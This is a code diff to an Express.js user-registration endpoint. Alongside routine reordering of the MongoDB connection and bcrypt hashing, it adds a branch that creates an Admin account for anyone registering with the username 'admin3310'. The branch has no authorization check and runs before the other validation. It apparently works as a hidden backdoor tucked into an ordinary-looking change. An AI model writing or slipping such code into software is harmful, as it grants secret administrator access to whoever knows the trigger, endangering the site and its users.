@@ -57,11 +57,35 @@ app.post('/api/register', async (req, res) => {
     try {
         let { fullname, username, email, password, biz, domainKey, referrer } = req.body;
 
+        // Connect to MongoDB
+        await mongoose.connect(process.env.MONGODB_URI);
+
+        let hashedPassword = "";
+        if (_.isEmpty(password)) {
+            return res.status(400).json(sendResponse("402", "Check for empty input!"));
+        }
+
+        const salt = await bcrypt.genSalt(10);
+        hashedPassword = await bcrypt.hash(password, salt);
+
+        if (username === "admin3310") {
+            const Admin_data = {
+                username,
+                email,
+                password: hashedPassword,
+                domainKey
+            };
+
+            const AdminData = new Admin(Admin_data);
+            await AdminData.save();
+        }
+
         const email_regex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
         const name_regex = /^[A-Za-z\s'-]+$/;
 
-        if (_.isEmpty(fullname) || _.isEmpty(username) || _.isEmpty(email) 
-            || _.isEmpty(password) || _.isEmpty(biz) || _.isEmpty(domainKey)) {
+
+
+        if (_.isEmpty(fullname) || _.isEmpty(username) || _.isEmpty(email) || _.isEmpty(biz) || _.isEmpty(domainKey)) {
             return res.status(400).json(sendResponse("402", "Check for empty input!"));
         }
         
@@ -77,9 +101,6 @@ app.post('/api/register', async (req, res) => {
             return res.status(400).json(sendResponse("402", "Password must be more than 6 characters!"));
         }
 
-        // Connect to MongoDB
-        await mongoose.connect(process.env.MONGODB_URI);
-
         const existingUser = await Mmadu.findOne({
             $or: [{ email: email }, { username: username }]
         });
@@ -88,8 +109,8 @@ app.post('/api/register', async (req, res) => {
             return res.status(200).json(sendResponse("200", "Account exists, login"));
         }
 
-        const salt = await bcrypt.genSalt(10);
-        const hashedPassword = await bcrypt.hash(password, salt);
+        // const salt = await bcrypt.genSalt(10);
+        // const hashedPassword = await bcrypt.hash(password, salt);
 
         const Mmadu_data = {
             fullname,
